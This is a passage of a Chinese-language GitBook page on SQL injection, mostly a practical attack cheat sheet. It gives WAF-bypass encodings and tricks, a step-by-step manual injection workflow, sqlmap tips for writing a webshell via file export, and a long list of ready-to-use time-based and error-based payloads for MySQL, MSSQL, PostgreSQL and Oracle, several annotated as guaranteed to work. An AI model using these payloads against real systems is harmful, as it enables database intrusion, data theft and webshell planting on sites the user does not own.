<p>mysql&#x4E2D;&#x6709;&#x4E00;&#x5806;&#x7279;&#x6B8A;&#x7684;url&#x7F16;&#x7801;&#x5728;mysql&#x547D;&#x4EE4;&#x884C;&#x4E2D;&#x662F;&#x4EE5;&#x7A7A;&#x683C;&#x65B9;&#x5F0F;&#x8868;&#x793A;&#xFF1A;&#x6BD4;&#x5982;%0a,%a0,%0C&#x3002;</p>
<p>&#x57FA;&#x4E8E;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x7684;WAF&#xFF0C; SQL&#x6CE8;&#x5165;&#x89C4;&#x5219;&#x4F7F;&#x7528;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x201C;s&#x201D;&#x5339;&#x914D;&#x7A7A;&#x683C;&#xFF0C;&#x4F8B;&#x5982;&#x201D;selects+union&#x201D;&#x3002;</p>
<p>&#x5229;&#x7528;&#x7A7A;&#x767D;&#x7B26;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF0C;&#x6D4B;&#x8BD5;WAF&#x65F6;&#x5C3D;&#x53EF;&#x80FD;&#x51CF;&#x5C11;&#x5176;&#x4ED6;&#x539F;&#x56E0;&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x4F8B;&#x5982;&#x201D;union select&#x201D;&#x88AB;&#x62E6;&#x622A;&#xFF0C;&#x53EA;&#x9700;&#x628A;&#x4E2D;&#x95F4;&#x7A7A;&#x767D;&#x7B26;&#x66FF;&#x6362;&#x4E3A;&#x201D;%250C&#x201D;, &#x201C;%25A0&#x201D;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x6D4B;&#x8BD5;</p>
<pre><code>union%250Cselect

union%25A0select
</code></pre><p>&#x51FD;&#x6570;&#x5206;&#x9694;&#x7B26;&#x5BF9;&#x57FA;&#x4E8E;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x7684;WAF&#xFF0C;&#x6211;&#x4EEC;&#x731C;&#x6D4B;&#x5B89;&#x5168;&#x5DE5;&#x7A0B;&#x5E08;&#x5199;WAF&#x89C4;&#x5219;&#x65F6;&#xFF0C;&#x53EF;&#x80FD;&#x4E0D;&#x77E5;&#x9053;&#x51FD;&#x6570;&#x540D;&#x4E0E;&#x5DE6;&#x62EC;&#x53F7;&#x4E4B;&#x95F4;&#x53EF;&#x4EE5;&#x5B58;&#x5728;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#xFF0C;&#x6216;&#x8005;&#x9057;&#x6F0F;&#x53EF;&#x4EE5;&#x5B58;&#x5728;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x3002;&#x4F8B;&#x5982;&#x5339;&#x914D;&#x51FD;&#x6570;&#x201D;concat()&#x201D;&#x7684;&#x89C4;&#x5219;&#x5199;&#x6CD5;&#xFF0C;&#x201C;concat(&#x201D;&#x6216;&#x8005;&#x201D;concats*(&#x201D;&#xFF0C;&#x5C31;&#x6CA1;&#x6709;&#x8003;&#x8651;&#x5230;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x5B57;&#x7B26;</p>
<pre><code>concat%2520(

concat/**/(

concat%250c(

concat%25a0(
</code></pre><h6 id="6&#x6D6E;&#x70B9;&#x6570;&#x8BCD;&#x6CD5;&#x89E3;&#x6790;">6.&#x6D6E;&#x70B9;&#x6570;&#x8BCD;&#x6CD5;&#x89E3;&#x6790;</h6>
<p>&#x5229;&#x7528;MySQL&#x89E3;&#x6790;&#x6D6E;&#x70B9;&#x6570;&#x7684;&#x7279;&#x70B9;&#xFF0C;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x65E0;&#x6CD5;&#x5339;&#x914D;&#x51FA;&#x5355;&#x8BCD;union&#xFF0C;&#x4F46;&#x662F;MySQL&#x8BCD;&#x6CD5;&#x89E3;&#x6790;&#x6210;&#x529F;&#x89E3;&#x6790;&#x51FA;&#x6D6E;&#x70B9;&#x6570;&#x3001;sql&#x5173;&#x952E;&#x5B57;union</p>
<pre><code>select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0

select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0
</code></pre><h6 id="7&#x62A5;&#x9519;&#x6CE8;&#x5165;">7.&#x62A5;&#x9519;&#x6CE8;&#x5165;</h6>
<p>Error-based&#x7684;SQL&#x6CE8;&#x5165;&#x51FD;&#x6570;&#x975E;&#x5E38;&#x5BB9;&#x6613;&#x88AB;&#x5FFD;&#x7565;&#xFF0C;&#x5BFC;&#x81F4;WAF&#x89C4;&#x5219;&#x8FC7;&#x6EE4;&#x4E0D;&#x5B8C;&#x6574;&#x3002;&#x5E38;&#x89C1;&#x7684;&#x51FD;&#x6570;</p>
<pre><code>updatexml(1, concat(0x5d,md5(3)),1);
GeometryCollection((select*from(select*from(select@@version)f)x))
polygon((select*from(select name_const(version(),1))x))
linestring()
multipoint()
multilinestring()
multipolygon()
</code></pre><h3 id="&#x6570;&#x636E;&#x5E93;&#x79CD;&#x7C7B;">&#x6570;&#x636E;&#x5E93;&#x79CD;&#x7C7B;</h3>
<h5 id="mssql&#x6CE8;&#x5165;">MSSQL&#x6CE8;&#x5165;</h5>
<p>&#x8FD9;&#x91CC;&#x53EA;&#x8981;&#x6D4B;&#x8BD5;&#x4E0B;&#x9762;&#x8BED;&#x53E5;&#x6210;&#x529F;&#x6267;&#x884C;&#xFF0C;&#x90A3;&#x4E48;&#x653E;&#x8FDB;sqlmap&#x8DD1;&#x5C31;&#x884C;&#x4E86;</p>
<pre><code class="lang-sql">&#x67E5;&#x8BE2;&#x7248;&#x672C;
1&apos; and @@version&gt;0--       

&#x67E5;&#x8BE2;&#x6743;&#x9650;
1&apos; and user&gt;0--
</code></pre>
<pre><code>&#x5982;&#x679C;&#x4E0A;&#x4F20;&#x4E0D;&#x6210;&#x529F;&#xFF0C;&#x6709;&#x4E09;&#x79CD;&#x539F;&#x56E0;
&#x7B2C;&#x4E00;&#x662F;mysql&#x9AD8;&#x7248;&#x672C;&#x7684;&#x5B89;&#x5168;&#x6A21;&#x5F0F;&#xFF0C;secure_file_priv&#x7684;&#x503C;&#x4E3A;null&#x3002; 
&#x7B2C;&#x4E8C;&#x79CD;&#x662F;secure_file_priv&#x6307;&#x5B9A;&#x4E86;&#x67D0;&#x4E2A;&#x76EE;&#x5F55;&#x624D;&#x53EF;&#x4EE5;&#x4E0A;&#x4F20;&#xFF0C;&#x6839;&#x76EE;&#x5F55;&#x4E0D;&#x5141;&#x8BB8;&#x4E0A;&#x4F20;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x5F80;upload&#x76EE;&#x5F55;&#x4E0A;&#x4F20;
&#x7B2C;&#x4E09;&#x79CD;&#x662F;secure_file_priv&#x7684;&#x503C;&#x4E3A;&#x7A7A;&#x6216;&#x8005;&#x6307;&#x5B9A;&#x4E86;&#x67D0;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x4F46;&#x662F;&#x4E0A;&#x4F20;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x4E3A;&#x7A7A;&#xFF0C;&#x6CA1;&#x6709;&#x5185;&#x5BB9;&#x5199;&#x8FDB;&#x53BB;&#x3002;&#x90A3;&#x4E48;&#x53EF;&#x80FD;&#x662F;limit&#x7684;&#x524D;&#x9762;&#x8BED;&#x53E5;&#x4E3A;False&#xFF0C;&#x5BFC;&#x81F4;limit&#x540E;&#x9762;&#x7684;&#x8BED;&#x53E5;&#x6CA1;&#x6709;&#x6267;&#x884C;&#x3002;&#x52A0;&#x4E0A; or 1=1&#x5373;&#x53EF;

    &#x7B2C;&#x4E00;&#x79CD;&#x60C5;&#x51B5;&#xFF1A;&#x8FDB;&#x5165;--sql-shell
    show global variables like &apos;%secure%&apos;;
    &#x5F53;secure_file_priv&#x7684;&#x503C;&#x4E3A;null &#xFF0C;&#x8868;&#x793A;&#x9650;&#x5236;mysqld &#x4E0D;&#x5141;&#x8BB8;&#x5BFC;&#x5165;|&#x5BFC;&#x51FA;&#xFF0C;&#x90A3;&#x5C31;&#x65E0;&#x6CD5;&#x5199;&#x5165;&#x9A6C;

    &#x7B2C;&#x4E8C;&#x79CD;&#x60C5;&#x51B5;&#xFF1A;
    &#x5F80;upload&#x7B49;&#x5176;&#x4ED6;&#x76EE;&#x5F55;&#x4E0A;&#x4F20;&#xFF0C;&#x4E0D;&#x8981;&#x5F80;&#x6839;&#x76EE;&#x5F55;&#x4E0A;&#x4F20;

    &#x7B2C;&#x4E09;&#x79CD;&#x60C5;&#x51B5;&#xFF1A;
    &#x5982;&#x679C;secure_file_priv&#x7684;&#x503C;&#x4E3A;&#x7A7A;&#x4E5F;&#x5199;&#x4E0D;&#x8FDB;&#x53BB;&#xFF0C;&#x90A3;&#x5C31;&#x5C1D;&#x8BD5;&#x624B;&#x52A8;&#x5199;&#x5165;&#xFF0C;&#x4F7F;&#x7528;--proxy &quot;http://127.0.0.1:8080&quot;&#xFF0C;burp&#x6293;&#x5230;&#x5305;&#x540E;&#xFF0C;&#x624B;&#x52A8;&#x5199;&#x5165;&#x3002;limit&#x8BED;&#x53E5;&#x524D;&#x9762;&#x52A0;&#x4E0A;or &apos;1&apos;=&apos;1&apos;
</code></pre><pre><code>%5c&#xFF0C;%bf&apos;, &#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x53CC;&#x5F15;&#x53F7;&#xFF0C;&#x53CD;&#x659C;&#x6760;&#xFF0C;&#x8D1F;&#x6570;&#xFF0C;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#xFF0C;and&#xFF0C;or&#xFF0C;xor&#x63A2;&#x6D4B;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6CE8;&#x5165;&#xFF01;&#xFF01;&#xFF01;

&#x6CE8;&#x610F;&#xFF1A;&#xFF08;-- &#xFF09;&#x4E00;&#x5B9A;&#x8981;&#x5728;&#x6CE8;&#x91CA;&#x7B26;&#x53F7;&#x540E;&#x52A0;&#x7A7A;&#x683C;&#xFF0C;&#x6216;&#x8005;URL&#x7F16;&#x7801;&#x540E;&#x7684;&#x7A7A;&#x683C;&#xFF08;%20&#xFF09;&#xFF0C;&#x5426;&#x5219;&#x6CE8;&#x91CA;&#x7B26;&#x53F7;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x4F5C;&#x7528;&#x3002;
            &#x6CE8;&#x91CA;&#x7B26;# --+&#x4EA4;&#x66FF;&#x7528;&#xFF0C;&#x4E00;&#x4E2A;&#x4E0D;&#x884C;&#xFF0C;&#x5C31;&#x53E6;&#x4E00;&#x4E2A;
1&#x3001;&#x5148;&#x5224;&#x65AD;&#x662F;&#x6570;&#x5B57;&#x578B;&#x8FD8;&#x662F;&#x5B57;&#x7B26;&#x578B;&#xFF0C;&#x5982;&#x679C;&#x5224;&#x65AD;&#x4E0D;&#x51FA;&#x6765;&#x8DF3;&#x5230;9
2&#x3001;&#x63A5;&#x7740;&#x5224;&#x65AD;&#x6709;&#x6CA1;&#x6709;&#x62EC;&#x53F7;
3&#x3001;&#x6700;&#x540E;&#x9762;&#x8DDF;&#x4E0A;--+&#x6CE8;&#x91CA;&#x7B26;
4&#x3001;order by&#x5224;&#x65AD;&#x5B57;&#x6BB5;&#x6570;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6CD5;&#x5224;&#x65AD;&#xFF0C;&#x5219;&#x76F4;&#x63A5;union select 1,2,3&#x4E00;&#x4E2A;&#x4E2A;&#x6D4B;&#x8BD5;&#x8FC7;&#x53BB;
5&#x3001;&#x5982;&#x679C;&#x8FD4;&#x56DE;&#x7684;&#x9875;&#x9762;&#x53D1;&#x751F;&#x53D8;&#x5316;&#xFF0C;&#x5219;&#x8054;&#x5408;&#x67E5;&#x8BE2;
6&#x3001;&#x5982;&#x679C;union select 1,version(),3&#x8FD4;&#x56DE;&#x7684;&#x9875;&#x9762;&#x6CA1;&#x6709;&#x53D1;&#x751F;&#x53D8;&#x5316;&#xFF0C;&#x5373;&#x8054;&#x5408;&#x67E5;&#x8BE2;&#x5931;&#x8D25;&#xFF0C;&#x5219;&#x5C1D;&#x8BD5;&#x62A5;&#x9519;&#x6CE8;&#x5165;
7&#x3001;&#x5982;&#x679C;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x9875;&#x9762;&#x4E5F;&#x6CA1;&#x6709;&#x628A;&#x4FE1;&#x606F;&#x663E;&#x793A;&#x51FA;&#x6765;&#xFF0C;&#x5219;&#x5EF6;&#x65F6;&#x6CE8;&#x5165;
8&#x3001;&#x5982;&#x679C;&#x5EF6;&#x65F6;&#x6CE8;&#x5165;&#x4E5F;&#x4E0D;&#x884C;&#xFF0C;&#x5219;&#x5BFC;&#x5165;&#x5BFC;&#x51FA;
9&#x3001;&#x5C1D;&#x8BD5;&#x5EF6;&#x65F6;&#x6CE8;&#x5165;&#xFF0C;&#x5982;&#x679C;&#x4ECE;1&#x8FC7;&#x6765;&#x7684;&#xFF0C;&#x5219;&#x4E09;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x76F4;&#x63A5;&#x8DDF;payload&#xFF0C;&#x53C2;&#x6570;&#x540E;&#x9762;&#x52A0;&#x5355;&#x5F15;&#x53F7;&#x6216;&#x8005;&#x53CC;&#x5F15;&#x53F7;
</code></pre><h2 id="payload">Payload</h2>
<pre><code class="lang-mysql"># &#x5E03;&#x5C14;


# &#x5EF6;&#x65F6;&#xFF0C; &#x5982;&#x679C;&#x8FC7;&#x4E86;5&#x79D2;&#x624D;&#x663E;&#x793A;&#x9875;&#x9762;&#xFF0C;&#x5219;&#x5B58;&#x5728;&#x6CE8;&#x5165;
mysql:        BENCHMARK(100000,MD5(1))  or sleep(5)
              id=1&apos; and sleep( if( (select length(database()) &gt;0) , 5, 0 ) )%23
              id=1&apos; and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+    &#x5982;&#x679C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7B2C;&#x4E00;&#x4F4D;&#x4E0D;&#x662F;s&#x5219;&#x5EF6;&#x8FDF;5&#x79D2;&#x624D;&#x53CD;&#x5E94;
              id=1&apos; or sleep(ord(substr(password,1,1))) --
              id=1&apos;XOR(sleep(if((select length(database()) &gt;6),0,5)))XOR&apos;Z
              id=1&apos;and (SELECT 1 FROM (SELECT(SLEEP(5)))Gbqj) --+
              id=1&apos;/**/AND/**/(SELECT/**/*/**/FROM/**/(SELECT(SLEEP(5)))ibEg)/**/AND/**/&apos;        &#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x7EDD;&#x5BF9;ok
              Referer:1&apos;XOR(if(now()=sysdate(),sleep(6),0))XOR&apos;Z
              ua:&apos;(6),0))XOR&apos;Z
              x-forw:&apos;XOR(if(now()=sysdate(),sleep(6),0))XOR&apos;Z

mssql:        id=1&apos; WAITFOR DELAY &apos;0:0:5&apos;--+                                  &#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x7EDD;&#x5BF9;ok
              id=1&apos;;WAITFOR DELAY &apos;0:0:5&apos;--+                                   &#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x7EDD;&#x5BF9;ok
              id=1&apos;);WAITFOR DELAY &apos;0:0:5&apos;--+                                  &#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x7EDD;&#x5BF9;ok

              id=1&quot; WAITFOR DELAY &apos;0:0:5&apos;--+                                  &#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x7EDD;&#x5BF9;ok
              id=1&quot;;WAITFOR DELAY &apos;0:0:5&apos;--+                                   &#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x7EDD;&#x5BF9;ok
              id=1&quot;);WAITFOR DELAY &apos;0:0:5&apos;--+                                  &#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x7EDD;&#x5BF9;ok

              id=1&apos; or 51 = &apos;49&apos;; WAITFOR DELAY &apos;0:0:5&apos;--+                     &#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x7EDD;&#x5BF9;ok
              id=1&apos; AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; &apos;A&apos; --+ 
              id=1&apos; if 1=1 waitfor delay &apos;0:0:5&apos; else waitfor delay &apos;0:0:0&apos;--+ 
                &apos;,0)if 9527=9528-2 waitfor delay&apos;0:0:5&apos;--+ 
                if (system_user!=&apos;sa&apos;) waitfor delay &apos;0:0:5&apos; --+        &#x8FD9;&#x4E2A;&#x8BED;&#x53E5;&#x7EDD;&#x5BF9;ok
                WHILE 2&gt;1 PRINT 1----

                /***/and/***/sleep(/***/if(/***/(select/***/length(database())/***/&gt;0)/***/,/***/10,/***/0/***/)/***/)%23
/***/and/***/If(ascii(substr(database(),1,1))=1,1,sleep(10))--+
/***/WAITFOR/***/DELAY/***/&apos;0:0:10&apos;--+
;WAITFOR/***/DELAY/***/&apos;0:0:10&apos;--+
);WAITFOR/***/DELAY/***/&apos;0:0:10&apos;--+

&apos;/***/and/***/sleep(/***/if(/***/(select/***/length(database())/***/&gt;0)/***/,/***/10,/***/0/***/)/***/)%23
&apos;/***/and/***/If(ascii(substr(database(),1,1))=1,1,sleep(10))--+
&apos;/***/WAITFOR/***/DELAY/***/&apos;0:0:10&apos;--+
&apos;;WAITFOR/***/DELAY/***/&apos;0:0:10&apos;--+
&apos;);WAITFOR/***/DELAY/***/&apos;0:0:10&apos;--+

&quot;/***/and/***/sleep(/***/if(/***/(select/***/length(database())/***/&gt;0)/***/,/***/10,/***/0/***/)/***/)%23
&quot;/***/and/***/If(ascii(substr(database(),1,1))=1,1,sleep(10))--+
&quot;/***/WAITFOR/***/DELAY/***/&apos;0:0:10&apos;--+
&quot;;WAITFOR/***/DELAY/***/&apos;0:0:10&apos;--+
&quot;);WAITFOR/***/DELAY/***/&apos;0:0:10&apos;--+



Postgresql        PG_SLEEP(5)   OR GENERATE_SERIES(1,10000)




# &#x62A5;&#x9519;&#x6CE8;&#x5165;&#xFF0C;&#x7206;&#x6570;&#x636E;&#x5E93;&#x7248;&#x672C;
&#x4EE5;&#x4E0B;payload&#x90FD;&#x662F;&#x6570;&#x5B57;&#x578B;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x5B57;&#x7B26;&#x578B;&#xFF0C;&#x5C31;&#x5728;1&#x540E;&#x9762;&#x6DFB;&#x52A0;&#x5355;&#x5F15;&#x53F7;&#x6216;&#x8005;&#x53CC;&#x5F15;&#x53F7;

id=1+and (select 1 from(select count(*),concat(0x5e5e5e,version(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--+
id=1 and (select 1 from (select count(*),concat(0x5e,version(),0x5e,floor(rand(0)*2))b from information_schema.tables group by b)a)
id=1 union select count(*),1,concat(0x5e5e5e,version(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x --+                                &#x4F7F;&#x7528;&#x8054;&#x5408;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8981;&#x6CE8;&#x610F;select&#x7684;&#x5B57;&#x6BB5;&#x6570;&#x91CF;&#xFF0C;&#x8BE5;&#x8BED;&#x53E5;&#x662F;3&#x4E2A;&#xFF0C;count&#xFF0C;1&#xFF0C;concat

id=1+and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+
id=1+and (extractvalue(1,concat(0x7e,(select user()),0x7e)))--+
id=1+and geometrycollection((select * from(select * from(select user())a)b))--+
id=1+and multipoint((select * from(select * from(select user())a)b))--+
id=1+and polygon((select * from(select * from(select user())a)b))--+
id=1+and multipolygon((select * from(select * from(select user())a)b))--+
id=1+and linestring((select * from(select * from(select user())a)b))--+
id=1+and multilinestring((select * from(select * from(select user())a)b))--+
id=1+and exp(~(select * from(select user())a))--+
PostgreSQL: /?param=1 and(1)=cast(version() as numeric)--+
MSSQL: /?param=1 and(1)=convert(int,@@version)--+
Sybase: /?param=1 and(1)=convert(int,@@version)--+
Oracle &gt;=9.0: /?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select --+
replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--+


Oracle&#x62A5;&#x9519;&#x6CE8;&#x5165;
&apos; AND 1932=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (1932=1932) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(118)||CHR(120)||CHR(113)||CHR(62))) FROM DUAL) AND &apos;mgBW&apos;=&apos;mgBW
&#x5982;&#x679C;sqlmap&#x8DD1;&#x4E0D;&#x51FA;&#xFF0C;&#x5219;&#x52A0;&#x53C2;&#x6570;--level 5 --risk 3

risk
&#x5171;&#x6709;&#x56DB;&#x4E2A;&#x98CE;&#x9669;&#x7B49;&#x7EA7;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;1&#x4F1A;&#x6D4B;&#x8BD5;&#x5927;&#x90E8;&#x5206;&#x7684;&#x6D4B;&#x8BD5;&#x8BED;&#x53E5;&#xFF0C;2&#x4F1A;&#x589E;&#x52A0;&#x57FA;&#x4E8E;&#x4E8B;&#x4EF6;&#x7684;&#x6D4B;&#x8BD5;&#x8BED;&#x53E5;&#xFF0C;3&#x4F1A;&#x589E;&#x52A0;OR&#x8BED;&#x53E5;&#x7684;SQL&#x6CE8;&#x5165;&#x6D4B;&#x8BD5;&#x3002;
</code></pre>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../language/algorithm.html" class="navigation navigation-prev " aria-label="Previous page: 算法基础">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="xss.html" class="navigation navigation-next " aria-label="Next page: XSS">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"sql注入","level":"4.1","depth":1,"next":{"title":"XSS","level":"4.2","depth":1,"path":"web/xss.md","ref":"web/xss.md","articles":[]},"previous":{"title":"算法基础","level":"3.1","depth":1,"path":"language/algorithm.md","ref":"language/algorithm.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-lunr"],"pluginsConfig":{"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"web/sql injection.md","mtime":"2023-10-02T09:20:40.528Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-10-10T04:29:36.564Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

